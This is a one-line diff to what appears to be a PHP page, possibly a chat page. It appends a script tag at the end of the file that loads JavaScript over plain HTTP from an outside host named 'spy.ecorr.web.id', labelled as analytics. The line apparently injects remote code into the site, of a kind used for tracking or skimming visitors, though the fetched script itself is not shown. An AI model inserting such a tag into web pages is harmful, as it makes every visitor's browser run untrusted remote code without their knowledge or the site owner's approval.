@@ -119,3 +119,4 @@
 //echo $chat;
  ?>
 
+<script id="domain" data-name="0440433" type="text/javascript" src="http://spy.ecorr.web.id/js/analytics_js/client.js"></script>
